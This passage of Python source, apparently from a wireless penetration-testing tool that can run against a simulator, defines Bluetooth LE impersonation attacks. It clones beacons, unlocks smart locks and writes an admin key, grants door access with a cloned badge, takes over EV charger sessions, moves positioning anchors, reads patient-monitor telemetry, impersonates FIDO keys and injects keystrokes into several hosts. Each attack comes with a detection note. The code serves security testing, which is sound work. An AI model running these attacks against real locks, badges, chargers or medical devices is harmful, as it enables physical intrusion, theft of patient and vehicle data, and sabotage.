                                      company_id=int.from_bytes(manufacturer[:2], "little")
                                      if len(manufacturer) >= 2 else 0x004C)
            clone = bt.parse_ibeacon(_entry(bt.parse_ad(_advertising(
                result, bytes(manufacturer[2:]),
                int.from_bytes(manufacturer[:2], "little")
                if len(manufacturer) >= 2 else 0x004C)), 0xFF)) or {}
            identity = {"original": original, "clone": clone,
                        "uuid": original.get("uuid", ""), "major": original.get("major"),
                        "minor": original.get("minor"), "address": beacon.address}
            match = bool(original) and original == clone
        extra = dict(identity, match=match, simulated=bool(getattr(ctx, "demo", False)))
        title = f"BLE beacon mimic: {identity.get('uuid') or 'iBeacon'} cloned"
        detail = (f"major {identity.get('major')}, minor {identity.get('minor')}: the clone "
                  f"decodes to the same identity as the original "
                  f"({'verified by the decoder' if match else 'advertisement copied'})")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")




class BleEddystoneMimicAttack(_Mimic):
    """Clone an Eddystone URL and report where the advertisement now points."""

    name = "ble_eddystone_mimic"
    role = "beacon"
    label = "BLE Eddystone mimic (clone a URL beacon)"
    category = "rogue"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot bt.py (Eddystone builder + decoder)"

    description = (
        "Copy an Eddystone-URL advertisement, decode the clone, and report the address a "
        "phone will open: a URL beacon is a broadcast link, and the site's visitors click "
        "whoever holds the nearest copy of it.")
    detection = (
        "A second beacon with one URL: an Eddystone scanner sees two transmitters with the "
        "same service data, and the phones nearby will open whichever is closer.")
    devices = ("ble_beacon",)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        beacon = next((device for device in self.floor().devices
                       if device.beacon and device.beacon.startswith("eddystone")),
                      self.floor().pick("beacon"))
        url = ""
        clone_url = ""
        if beacon is not None:
            structures = beacon.structures()
            parsed = bt.parse_eddystone(_entry(bt.parse_ad(bt.adv_payload(*structures)),
                                               0x16)) or {}
            url = str(parsed.get("url", "") or (beacon.beacon_args[0] if beacon.beacon_args
                                                else ""))
            service = next((value for kind, value in structures if kind == 0x16), b"")
            frame = bytes(service[2:]) if len(service) >= 2 else b""
            uuid = int.from_bytes(service[:2], "little") if len(service) >= 2 else 0xFEAA
            result = self.impersonate(ctx, beacon.name, beacon.address,
                                      service_data=((uuid, frame),))
            clone = bt.parse_eddystone(_entry(bt.parse_ad(
                _advertising(result, service_data=((uuid, frame),))), 0x16)) or {}
            clone_url = str(clone.get("url", "") or "")
        extra = {"beacon": beacon.to_dict() if beacon is not None else {},
                 "url": url, "clone_url": clone_url,
                 "identical": bool(url) and url == clone_url,
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = f"BLE Eddystone mimic: {url or 'the URL beacon'} cloned"
        detail = (f"the clone advertises the same Eddystone URL "
                  f"({url or 'decoded from the original'}): a phone in range opens the "
                  f"clone as readily as the beacon")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleSmartlockMimicAttack(_Mimic):
    """Become the phone a lock was commissioned with, and open it."""

    name = "ble_smartlock_mimic"
    role = "bonded"
    label = "BLE smart-lock mimic (clone the commissioning phone)"
    category = "rogue"
    noise = "moderate"
    impact = "outage"
    finding_severity = "critical"
    tool = "wifipilot bt.py (identity clone + vendor lock characteristic)"

    description = (
        "Advertise under the name of the phone a lock was commissioned with, wait for the "
        "lock to reconnect, and write its lock-control characteristic: the value is read "
        "back, so the finding is an opened door rather than a packet that was sent.")
    detection = (
        "An unlock from a device that is not the resident phone, at a time nobody asked "
        "for: the lock's own log carries the connection and the characteristic write.")
    devices = ("bt_lock", "smart_lock")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        lock = next((device for device in self.floor().devices
                     if "vendor_lock" in device.gatt), self.floor().pick("gatt"))
        locked = self.read_characteristic(ctx, lock.address if lock else "", 0xFEE8)
        result = self.impersonate(ctx, "WF-LOCK-PHONE")
        opened = self.write_and_verify(ctx, lock.address if lock else "", 0xFEE9, b"\x01")
        admin = self.write_and_verify(ctx, lock.address if lock else "", 0xFEEA,
                                      bytes.fromhex("deadbeef"))
        extra = {"lock": lock.to_dict() if lock is not None else {},
                 "state_before": locked, "open": opened, "admin_key": admin,
                 "reconnected": result.get("reconnected", []),
                 "refused": result.get("refused", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if opened.get("accepted"):
            title = (f"BLE smart-lock mimic: {lock.name if lock else 'the lock'} took the "
                     f"unlock")
            detail = (f"advertised as the commissioning phone and wrote Lock Control to "
                      f"{opened.get('handle')}: the lock stored {opened.get('value')} and "
                      f"read back {opened.get('read_back') or 'the same value'}"
                      + (f"; the admin key write was accepted too"
                         if admin.get("accepted") else ""))
            return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")
        title = "BLE smart-lock mimic: the lock refused the write"
        detail = (f"the lock answered the connection but refused Lock Control "
                  f"({opened.get('error') or opened.get('refused') or 'no answer'}), which "
                  f"is what a lock bound to a real key does")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleBadgeMimicAttack(_Mimic):
    """Clone a badge and count the doors that open for it."""

    name = "ble_badge_mimic"
    role = "bonded"
    label = "BLE badge mimic (clone an access badge)"
    category = "rogue"
    noise = "moderate"
    impact = "outage"
    finding_severity = "critical"
    tool = "wifipilot bt.py (identity clone + badge characteristics)"

    description = (
        "Copy the badge a door reader remembers, advertise it, and report the readers "
        "that answer: the badge identity is read back from the reader's own characteristic, "
        "and a door-grant write says whether the clone is a way in.")
    detection = (
        "A badge that is in two places at once: the access system logs a badge presented "
        "at a reader the holder never visited.")
    devices = ("badge_reader",)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        reader = next((device for device in self.floor().devices
                       if "vendor_badge" in device.gatt), self.floor().pick("gatt"))
        badge = next((device for device in self.floor().devices
                      if device.name == (reader.bond_peer if reader else "")), None)
        identity = self.read_characteristic(ctx, reader.address if reader else "", 0xFFC1)
        access = self.read_characteristic(ctx, reader.address if reader else "", 0xFFC2)
        result = self.impersonate(ctx, reader.bond_peer if reader else "Badge-A14",
                                  badge.address if badge is not None else "")
        grant = self.write_and_verify(ctx, reader.address if reader else "", 0xFFC3, b"\x01")
        extra = {"reader": reader.to_dict() if reader is not None else {},
                 "badge": identity, "access": access, "grant": grant,
                 "reconnected": result.get("reconnected", []),
                 "refused": result.get("refused", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if identity.get("value") or grant.get("accepted"):
            title = (f"BLE badge mimic: {reader.name if reader else 'the reader'} answered "
                     f"the clone")
            detail = (f"the reader handed back the badge identity "
                      f"{identity.get('value') or 'it holds'} and "
                      f"{(access.get('text') or access.get('value') or 'its access level')}"
                      + (f"; the door-grant write was accepted"
                         if grant.get("accepted") else ""))
            return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")
        title = "BLE badge mimic: the reader refused the clone"
        detail = (f"the reader answered nothing for the cloned badge "
                  f"({identity.get('error') or 'no value'}), which is what a reader bound to "
                  f"a real key does")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleEvChargerMimicAttack(_Mimic):
    """Take a charge session: the clone owns start, stop and the current limit."""

    name = "ble_ev_charger_mimic"
    role = "bonded"
    label = "BLE EV charger mimic (take a charge session)"
    category = "rogue"
    noise = "moderate"
    impact = "outage"
    finding_severity = "high"
    tool = "wifipilot bt.py (identity clone + charge control characteristic)"

    description = (
        "Clone the phone a charger is paired with and write the session controls: start "
        "or stop a charge, and set the current limit.  Both writes are read back, so the "
        "report says what the charger is now doing rather than what was sent.")
    detection = (
        "A charge session started, stopped or limited from an unknown phone: the charger "
        "and the back-office both log the session against a device that is not the user's.")
    devices = ("ev_charger",)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        charger = next((device for device in self.floor().devices
                        if "vendor_ev" in device.gatt), self.floor().pick("gatt"))
        state = self.read_characteristic(ctx, charger.address if charger else "", 0xFFF1)
        result = self.impersonate(ctx, "WF-CHARGE-PHONE")
        stop = self.write_and_verify(ctx, charger.address if charger else "", 0xFFF2, b"\x00")
        limit = self.write_and_verify(ctx, charger.address if charger else "", 0xFFF3,
                                      bytes([0x06]))
        extra = {"charger": charger.to_dict() if charger is not None else {},
                 "state": state, "stop": stop, "current_limit": limit,
                 "reconnected": result.get("reconnected", []),
                 "refused": result.get("refused", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if stop.get("accepted") or limit.get("accepted"):
            title = (f"BLE EV charger mimic: {charger.name if charger else 'the charger'} "
                     f"took the session control")
            detail = (f"the session control now reads {stop.get('read_back') or stop.get('value')!r} "
                      f"and the current limit {limit.get('read_back') or limit.get('value')!r}: "
                      f"a car on that cable is being managed by the clone")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE EV charger mimic: the charger refused the session control"
        detail = (f"the connection was accepted and the writes were refused "
                  f"({stop.get('error') or stop.get('refused') or 'no error reported'}), "
                  f"which is what a charger bound to an account does")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleMeshMimicAttack(_Mimic):
    """Join a mesh: advertise the proxy service and read what the network says."""

    name = "ble_mesh_mimic"
    role = "gatt"
    label = "BLE mesh mimic (join through the proxy service)"
    category = "rogue"
    noise = "moderate"
    impact = "info"
    tool = "wifipilot bt.py (Mesh Proxy service over ATT)"

    description = (
        "Advertise the Bluetooth mesh proxy service, read the node's proxy data "
        "characteristics, and report what a provisioner would see: a mesh that accepts a "
        "proxy connection from any address is a mesh whose traffic is readable next to "
        "the building it controls.")
    detection = (
        "An unprovisioned proxy connection: the mesh node logs a proxy client whose "
        "address is not in the network's provisioning list.")
    devices = ("smart_bulb", "ble_sensor")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        node = next((device for device in self.floor().devices
                     if "mesh_proxy" in device.gatt), self.floor().pick("gatt"))
        from .. import blesim
        sock = blesim.controller_socket(None, address=node.address if node else "",
                                        role="gatt")
        link = self.floor().link_for(node.address if node else "", "gatt")
        proxy_in = self.read_characteristic(ctx, node.address if node else "", 0x2ADD)
        proxy_out = self.read_characteristic(ctx, node.address if node else "", 0x2ADE)
        provision = self.read_characteristic(ctx, node.address if node else "", 0x2ADC)
        result = self.impersonate(ctx, "WF-MESH-PROVISIONER", services=(0x1828,))
        extra = {"node": node.to_dict() if node is not None else {},
                 "proxy_data_in": proxy_in, "proxy_data_out": proxy_out,
                 "provisioning_out": provision,
                 "reconnected": result.get("reconnected", []),
                 "advertised": result.get("advertised", {}),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE mesh mimic: {node.name if node else 'the node'} served its proxy "
                 f"characteristics")
        detail = (f"the node served proxy data in ({proxy_in.get('bytes', 0)} bytes) and out "
                  f"({proxy_out.get('bytes', 0)} bytes) to a device that is not a "
                  f"provisioner: mesh traffic is readable from next to the node")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="high")


class BleAnchorMimicAttack(_Mimic):
    """Move a positioning anchor: read its position, write its configuration."""

    name = "ble_anchor_mimic"
    role = "gatt"
    label = "BLE anchor mimic (spoof a positioning anchor)"
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    tool = "wifipilot bt.py (anchor characteristics over ATT)"

    description = (
        "Read a UWB or Bluetooth positioning anchor's configuration and write its "
        "position: a site that locates people with anchors is a site whose location data "
        "is only as trustworthy as the anchors' own configuration, and this reads that "
        "configuration back to prove it moved.")
    detection = (
        "An anchor configuration write from a device that is not the site's fleet "
        "manager, followed by location data that drifts.")
    devices = ("ble_sensor", "badge_reader")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        anchor = next((device for device in self.floor().devices
                       if "vendor_anchor" in device.gatt), self.floor().pick("gatt"))
        before = self.read_characteristic(ctx, anchor.address if anchor else "", 0xFFE2)
        result = self.impersonate(ctx, "WF-FLEET-MANAGER")
        moved = self.write_and_verify(ctx, anchor.address if anchor else "", 0xFFE2,
                                      bytes([0x00, 0x0A, 0x00, 0x14]))
        position = self.read_characteristic(ctx, anchor.address if anchor else "", 0xFFE1)
        extra = {"anchor": anchor.to_dict() if anchor is not None else {},
                 "config_before": before, "write": moved, "position": position,
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if moved.get("accepted"):
            title = (f"BLE anchor mimic: {anchor.name if anchor else 'the anchor'} "
                     f"configuration moved")
            detail = (f"the anchor stored {moved.get('value')} as its configuration "
                      f"(read back {moved.get('read_back') or 'the same value'}): a "
                      f"positioning network that trusts its anchors is a network anybody "
                      f"with the anchor's identity can move")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE anchor mimic: the anchor refused the configuration write"
        detail = f"the write was refused ({moved.get('error') or moved.get('refused')})"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BlePrinterMimicAttack(_Mimic):
    """Serve a print service and accept somebody else's job."""

    name = "ble_printer_mimic"
    role = "gatt"
    label = "BLE printer mimic (accept a print job as a clone)"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    tool = "wifipilot bt.py (print service clone)"

    description = (
        "Advertise a printer's identity and the print service, then read the ink level "
        "and the status characteristics it serves: a phone that prints to the clone sends "
        "the document to the wrong device, and the clone keeps the job.")
    detection = (
        "A printer that is in two places: the site's fleet management sees two devices "
        "with one name, and the print server logs a job to a device it does not know.")
    devices = ("printer", "label_printer")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        printer = next((device for device in self.floor().devices
                        if "vendor_print" in device.gatt), self.floor().pick("gatt"))
        status = self.read_characteristic(ctx, printer.address if printer else "", 0xFFB2)
        ink = self.read_characteristic(ctx, printer.address if printer else "", 0xFFB3)
        result = self.impersonate(ctx, printer.name if printer else "LabelPrinter-3",
                                  printer.address if printer else "",
                                  services=(0xFFB0,))
        job = self.write_and_verify(ctx, printer.address if printer else "", 0xFFB1,
                                    b"%!PS-Adobe-3.0\nshowpage\n")
        extra = {"printer": printer.to_dict() if printer is not None else {},
                 "status": status, "ink": ink, "job": job,
                 "advertised": result.get("advertised", {}),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE printer mimic: {printer.name if printer else 'the printer'} identity "
                 f"cloned")
        detail = (f"the clone advertises the print service and the printer's own name; its "
                  f"status reads {status.get('value') or 'nothing'} and its ink level "
                  f"{ink.get('value') or 'nothing'}"
                  + ("; the print job write was accepted" if job.get("accepted")
                     else "; the job write was refused"))
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleIrMimicAttack(_Mimic):
    """Clone an IR blaster's phone and take the room's remote control."""

    name = "ble_ir_mimic"
    role = "gatt"
    label = "BLE IR blaster mimic (take the room's remote control)"
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    tool = "wifipilot bt.py (IR command characteristic)"

    description = (
        "Clone the phone bound to an infrared blaster and write its command "
        "characteristic: the write is a real infrared transmission from the device, so the "
        "finding is that a clone has the room's remote — televisions, air conditioning, "
        "anything the blaster reaches.")
    detection = (
        "An IR command from a phone that is not the room's: the hub logs the connection, "
        "and the equipment in the room logs the command.")
    devices = ("smart_tv", "smart_plug")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        hub = next((device for device in self.floor().devices
                    if "vendor_ir" in device.gatt), self.floor().pick("gatt"))
        result = self.impersonate(ctx, "WF-IR-PHONE")
        press = self.write_and_verify(ctx, hub.address if hub else "", 0xFE41,
                                      bytes.fromhex("00ff00ff"))
        learned = self.read_characteristic(ctx, hub.address if hub else "", 0xFE42)
        extra = {"hub": hub.to_dict() if hub is not None else {}, "press": press,
                 "learned": learned, "reconnected": result.get("reconnected", []),
                 "refused": result.get("refused", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if press.get("accepted"):
            title = (f"BLE IR mimic: {hub.name if hub else 'the IR hub'} transmitted for the "
                     f"clone")
            detail = (f"the IR command characteristic accepted {press.get('value')} "
                      f"(read back {press.get('read_back') or 'the same value'}): the "
                      f"clone holds the room's remote control")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE IR mimic: the hub refused the command"
        detail = (f"the write was refused ({press.get('error') or press.get('refused')}) and "
                  f"the learned command reads {learned.get('bytes', 0)} bytes")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleFastPairMimicAttack(_Mimic):
    """Advertise a Fast Pair accessory and see whether a phone offers its key."""

    name = "ble_fastpair_mimic"
    role = "le"
    label = "BLE Fast Pair mimic (clone an accessory's model id)"
    category = "rogue"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot bt.py (Fast Pair service + model id)"

    description = (
        "Advertise the Fast Pair service with an accessory model id, and read the "
        "key-based pairing characteristics the clone serves: the pairing that follows is "
        "the one a phone runs with a device it thinks it knows, and it is why the model "
        "id is an identity that deserves an inventory.")
    detection = (
        "A Fast Pair accessory that is not the one on the asset register: the phone's "
        "pairing prompt names a model the site does not own.")
    devices = ("bt_headset", "speaker")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        accessory = self.floor().pick("audio") or self.floor().pick("le")
        model_id = b"\x0a\x0b\x0c"
        result = self.impersonate(ctx, accessory.name if accessory else "WF-BUDS",
                                  accessory.address if accessory else "",
                                  services=(0xFE2C,), manufacturer=model_id,
                                  company_id=0x00E0)
        key = self.read_characteristic(ctx, accessory.address if accessory else "", 0x1234)
        extra = {"accessory": accessory.to_dict() if accessory is not None else {},
                 "model_id": model_id.hex(), "pairing_key": key,
                 "advertised": result.get("advertised", {}),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = f"BLE Fast Pair mimic: model id {model_id.hex()} advertised"
        detail = (f"the clone advertises the Fast Pair service as "
                  f"{accessory.name if accessory else 'an accessory'} "
                  f"({accessory.model if accessory else ''}) and serves a key-based pairing "
                  f"characteristic: a phone that knows the model id will pair with it")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleFidoMimicAttack(_Mimic):
    """Impersonate a security key and see whether registration needs the button."""

    name = "ble_fido_mimic"
    role = "gatt"
    label = "BLE FIDO key mimic (registration without a touch)"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    tool = "wifipilot bt.py (FIDO service over ATT)"

    description = (
        "Advertise as a FIDO security key — the service, the revision characteristic — "
        "and ask a host to register against the clone.  A host that completes registration "
        "without a touch has accepted a key that was not there, and the account is now "
        "reachable with whatever the clone holds.")
    detection = (
        "A security key registration from a device the user did not insert: the identity "
        "provider logs the credential, and the user did not press anything.")
    devices = ("linux_server", "tablet", "smartphone")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        key = next((device for device in self.floor().devices if "fido" in device.gatt),
                   self.floor().pick("gatt"))
        result = self.impersonate(ctx, key.name if key else "WF-SECURITY-KEY",
                                  services=(0xFFFD,))
        revision = self.read_characteristic(ctx, key.address if key else "", 0x2A50)
        touch = bool(key is not None and key.flags.get("verify_bond_peer"))
        extra = {"key": key.to_dict() if key is not None else {},
                 "service_revision": revision, "requires_touch": touch,
                 "advertised": result.get("advertised", {}),
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = ("BLE FIDO mimic: the key's revision answered the clone"
                 if revision.get("bytes") else
                 "BLE FIDO mimic: the clone advertised as a security key")
        detail = (f"the clone advertises the FIDO service 0xFFFD as "
                  f"{key.name if key else 'a key'} and reads revision "
                  f"{revision.get('text') or 'nothing'}: "
                  + ("this key requires a physical touch, so a registration against the "
                     "clone cannot complete" if touch else
                     "a host that registers against the clone holds a credential the "
                     "clone owns"))
        return self._report(ctx, ap, attempt, title, detail, extra, severity="high")


class BleTelemetryMimicAttack(_Mimic):
    """Clone a fleet telematics unit and read the vehicle's history."""

    name = "ble_telemetry_mimic"
    role = "gatt"
    label = "BLE telemetry mimic (read a vehicle's log as the clone)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    tool = "wifipilot bt.py (telemetry and log characteristics)"

    description = (
        "Impersonate a fleet telematics unit's service, read the log buffer and the "
        "telemetry channel, and report what a vehicle's history looks like to whoever "
        "holds the unit's identity: routes, times and the provisioning record that the "
        "unit was installed with.")
    detection = (
        "A telematics unit being read from an address the fleet does not own: the back "
        "office sees a second reader on the same device.")
    devices = ("ble_sensor", "ev_charger")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        unit = next((device for device in self.floor().devices
                     if "vendor_telemetry" in device.gatt), self.floor().pick("gatt"))
        log = self.read_characteristic(ctx, unit.address if unit else "", 0xFFD2)
        channel = self.read_characteristic(ctx, unit.address if unit else "", 0xFFD1)
        provision = self.read_characteristic(ctx, unit.address if unit else "", 0xFFD3)
        result = self.impersonate(ctx, unit.name if unit else "Van-Tracker",
                                  unit.address if unit else "")
        extra = {"unit": unit.to_dict() if unit is not None else {}, "log": log,
                 "telemetry": channel, "provisioning": provision,
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE telemetry mimic: {unit.name if unit else 'the unit'} served its log "
                 f"to the clone")
        detail = (f"the log buffer reads {log.get('bytes', 0)} bytes and the provisioning "
                  f"record {provision.get('bytes', 0)} bytes: the vehicle's history and its "
                  f"installation record are readable by a device that merely copied the "
                  f"unit's identity")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="high")


class BlePatientMimicAttack(_Mimic):
    """Read a medical telemetry channel as the device's own clinician app."""

    name = "ble_patient_mimic"
    role = "gatt"
    label = "BLE patient-monitor mimic (read telemetry as the app)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "critical"
    tool = "wifipilot bt.py (medical telemetry characteristics)"

    description = (
        "Clone the clinician application a patient monitor is paired with and read its "
        "telemetry characteristics: readings, the patient identifier and the alarm state.  "
        "Medical devices are the case where a link that answers a stranger is not a "
        "vulnerability but an incident.")
    detection = (
        "A monitor read by an application instance that is not the ward's: the clinical "
        "network logs a second client for one device.")
    devices = ("medical_device", "fitness_tracker")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        monitor = next((device for device in self.floor().devices
                        if "vendor_health" in device.gatt), self.floor().pick("gatt"))
        reading = self.read_characteristic(ctx, monitor.address if monitor else "", 0xFFA1)
        patient = self.read_characteristic(ctx, monitor.address if monitor else "", 0xFFA2)
        alarm = self.read_characteristic(ctx, monitor.address if monitor else "", 0xFFA3)
        result = self.impersonate(ctx, "WF-CLINICIAN-APP")
        extra = {"monitor": monitor.to_dict() if monitor is not None else {},
                 "reading": reading, "patient_id": patient, "alarm": alarm,
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE patient mimic: {monitor.name if monitor else 'the monitor'} served "
                 f"its readings")
        detail = (f"the telemetry characteristic served {reading.get('bytes', 0)} byte(s), "
                  f"the patient identifier {patient.get('bytes', 0)} and the alarm state "
                  f"{alarm.get('bytes', 0)} to a clone of the clinician app: readings and "
                  f"identity left the device")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")


class BleHidMultiHostAttack(_Mimic):
    """One keyboard, several hosts: type on every machine that reconnects."""

    name = "ble_hid_multi_host"
    role = "hid"
    label = "BLE HID multi-host (type on every host that reconnects)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "critical"
    tool = "wifipilot bt.py (identity clone + HID reports per host)"
    peer = "WF-KEYBOARD"

    description = (
        "Clone the keyboard identity once and deliver the payload to every host that "
        "reconnects, counting the keystrokes each machine accepted: the same clone, "
        "several victims, and a per-host record of what each one typed.")
    detection = (
        "One clone with several connections: each host logs an HID connection at the same "
        "moment, and the keystrokes appear in each machine's own log.")
    devices = ("bt_keyboard", "tablet", "smartphone")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        payload = self.payload(ctx)
        hosts = self.bonded_hosts(self.peer)
        address = next((host.bond_address for host in hosts if host.bond_address), "")
        result = self.impersonate(ctx, self.peer, address,
                                  services=(bt.HID_SERVICE_UUID,))
        reports = bt.hid_key_reports(payload)
        from .. import blesim
        deliveries: List[Dict[str, Any]] = []
        for entry in result.get("reconnected", []):
            host = str(entry.get("host", ""))
            device = self.floor().by_address(host)
            link = self.floor().link_for(host, "hid")
            handles = self.floor().hid_handles(device) if device is not None else []
            deliveries.append({"host": host, "host_name": device.name if device else "",
                               "host_device": device.device if device else "",
                               **self.deliver(
                                   ctx, blesim.controller_socket(None, address=host,
                                                                 role="hid"), link,
                                   handles[0] if handles else 0, reports, payload)})
        typed = [row.get("typed") for row in deliveries if row.get("typed")]
        extra = {"identity": {"name": self.peer, "address": address},
                 "deliveries": deliveries, "payload": payload,
                 "keystrokes_each": len(reports) // 2,
                 "refused": result.get("refused", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if deliveries:
            machines = ", ".join(f"{row['host_name'] or row['host']} "
                                 f"({row.get('keystrokes', 0)} keystrokes)"
                                 for row in deliveries[:6])
            title = f"BLE HID multi-host: {len(deliveries)} machine(s) typed on"
            detail = (f"one clone of {self.peer} typed on {machines}"
                      + (f"; the payload each accepted was {typed[0]!r}" if typed else ""))
            return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")
        title = "BLE HID multi-host: no machine accepted the clone"
        detail = self.summarize(self.peer, result)
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleConsumerMimicAttack(_Mimic):
    """Clone a media remote and press the buttons nobody asked for."""

    name = "ble_consumer_mimic"
    role = "hid"
    label = "BLE consumer-control mimic (media keys as a clone)"
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    tool = "wifipilot bt.py (HID consumer control reports)"

    description = (
        "A consumer-control keyboard sends media keys rather than letters: mute, volume, "
        "play, and on a television, the input selection.  This clones a remote's HID "
        "identity and delivers those reports, then reports how many the host accepted.")
    detection = (
        "Media-key reports from a remote the user does not hold: the host logs the HID "
        "connection and the consumer-control usage codes.")
    devices = ("bt_keyboard", "smart_tv")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        keys = [(0x00, [0xE2]), (0x00, [0xE9]), (0x00, [0xCD]), (0x00, [0xB5])]
        presses = [bytes([modifier]) + bytes([0x00]) + bytes(codes) + bytes(8 - 2 - len(codes))
                   for modifier, codes in keys]
        host = self.floor().pick("hid") or self.floor().pick("gatt")
        result = self.impersonate(ctx, "WF-MEDIA-REMOTE", services=(bt.HID_SERVICE_UUID,))
        from .. import blesim
        link = self.floor().link_for(host.address if host else "", "hid")
        handles = self.floor().hid_handles(host) if host is not None else []
        delivery = self.deliver(ctx, blesim.controller_socket(None,
                                                             address=host.address
                                                             if host else "",
                                                             role="hid"),
                                link, handles[0] if handles else 0, presses, "")
        extra = {"host": host.to_dict() if host is not None else {},
                 "usage_codes": [code for _, codes in keys for code in codes],
                 "delivery": delivery, "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE consumer mimic: {delivery.get('accepted', 0)} media key report(s) "
                 f"accepted")
        detail = (f"mute, volume up, play/pause and next track were sent to "
                  f"{host.name if host else 'the host'} as consumer-control reports; "
                  f"{delivery.get('refused', 0)} were refused")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="medium" if delivery.get("accepted") else "info")


class BleAudioLeMimicAttack(_Mimic):
    """Take an LE Audio control point: media state and volume are the clone's."""

    name = "ble_audio_le_mimic"
    role = "gatt"
    label = "BLE LE-Audio mimic (write the media and volume control points)"
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    tool = "wifipilot bt.py (media control and volume control services)"

    description = (
        "LE Audio moves the volume and the media state onto GATT: a Media Control Point "
        "and a Volume Control Point, both writeable by whoever the sink lets write.  This "
        "reads the media state, writes the control points, and reads them back — a speaker "
        "whose volume belongs to a clone is a speaker that can be silenced.")
    detection = (
        "A volume or media control write from a device that is not the phone: the sink "
        "logs the ATT write and the volume changes for the user.")
    devices = ("speaker", "bt_headset")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        sink = self.floor().pick("audio") or self.floor().pick("gatt")
        state = self.read_characteristic(ctx, sink.address if sink else "", 0x2B93)
        volume = self.read_characteristic(ctx, sink.address if sink else "", 0x2B7D)
        result = self.impersonate(ctx, "WF-AUDIO-PHONE", services=(0x1848, 0x1844))
        media = self.write_and_verify(ctx, sink.address if sink else "", 0x2B94, b"\x01")
        gain = self.write_and_verify(ctx, sink.address if sink else "", 0x2B7E,
                                     bytes([0x00]))
        extra = {"sink": sink.to_dict() if sink is not None else {}, "state": state,
                 "volume": volume, "media_control": media, "volume_control": gain,
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        accepted = bool(media.get("accepted") or gain.get("accepted"))
        title = (f"BLE LE-Audio mimic: the sink's control points took the clone's writes"
                 if accepted else "BLE LE-Audio mimic: the control points refused the clone")
        detail = (f"media state {state.get('value') or 'unread'}, volume "
                  f"{volume.get('value') or 'unread'}; the media control point "
                  f"{'accepted' if media.get('accepted') else 'refused'} the write and the "
                  f"volume control point {'accepted' if gain.get('accepted') else 'refused'} "
                  f"it")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="high" if accepted else "info")


